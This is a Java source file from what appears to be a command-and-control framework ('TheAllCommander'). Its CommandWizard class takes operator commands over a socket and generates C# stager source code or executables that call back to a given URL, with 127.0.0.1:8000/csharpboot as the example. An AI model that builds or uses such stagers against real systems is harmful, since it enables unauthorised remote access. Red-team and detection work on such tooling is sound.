package c2.session;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.Socket;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;

import c2.csharp.StagerGenerator;

public class CommandWizard implements Runnable {

	public static String CMD_QUIT = "quit";
	public static String CMD_GENERATE_CSHARP = "generate_csharp";

	private Socket socket;
	private Path csharpConfigDir;

	public CommandWizard(Socket socket, Path csharpConfigDir) {
		this.socket = socket;
		this.csharpConfigDir = csharpConfigDir;
	}

	@Override
	public void run() {
		try {
			BufferedReader br = new BufferedReader(new InputStreamReader(socket.getInputStream()));
			OutputStreamWriter bw = new OutputStreamWriter(socket.getOutputStream());
			printAvailableCommands(bw);

			
			boolean stayRunning = true;
			while (stayRunning) {
				String nextCommand = br.readLine();
				if (nextCommand.equalsIgnoreCase(CMD_QUIT)) {
					stayRunning = false;
					bw.write("Goodbye!" + System.lineSeparator());
				} else if (nextCommand.startsWith(CMD_GENERATE_CSHARP)) {
					String args[] = nextCommand.split(" ");
					if (args.length < 4) {
						bw.write("Improper format" + System.lineSeparator());
					} else {
						List<String> connectionArgs = new ArrayList<>();
						for (int idx = 3; idx < args.length; idx++) {
							connectionArgs.add(args[idx]);
						}

						if (args[1].equalsIgnoreCase("text")) {
							try {
								bw.write(StagerGenerator.generateStagedSourceFile(csharpConfigDir, args[2],
										connectionArgs) + System.lineSeparator());
							} catch (IOException ex) {
								bw.write("Unable to generate source file " + ex.getMessage() + System.lineSeparator());
							}
						} else if (args[1].equalsIgnoreCase("exe")) {
							try {
								bw.write("<control> " + CommandWizard.CMD_GENERATE_CSHARP + " " + StagerGenerator.generateStagerExe(csharpConfigDir, args[2], connectionArgs) + System.lineSeparator());
							} catch (IOException ex) {
								bw.write("Unable to generate exe file " + ex.getMessage() + System.lineSeparator());
							}
						} else {
							bw.write("Unknown format option for " + CMD_GENERATE_CSHARP + System.lineSeparator());
						}
					}
				}else {
					bw.write("Unknown command" + System.lineSeparator());
				}
				bw.flush();
			}

			socket.close();
		} catch (IOException ex) {

		}

	}

	private void printAvailableCommands(OutputStreamWriter bw) throws IOException {
		bw.write("Available commands: " + System.lineSeparator());
		bw.write(CMD_GENERATE_CSHARP + " text <format - http> <argments>" + System.lineSeparator());
		bw.write("Example: " + CMD_GENERATE_CSHARP + " text http https://127.0.0.1:8000/csharpboot"
				+ System.lineSeparator());
		bw.write(CMD_GENERATE_CSHARP + " exe <format - http> <argments>" + System.lineSeparator());
		bw.write("Example: " + CMD_GENERATE_CSHARP + " exe http https://127.0.0.1:8000/csharpboot"
				+ System.lineSeparator());
		bw.write("Note: Only available with TheAllCommander on Windows" + System.lineSeparator());
		bw.write(CMD_QUIT + System.lineSeparator());
		bw.flush();
	}

}
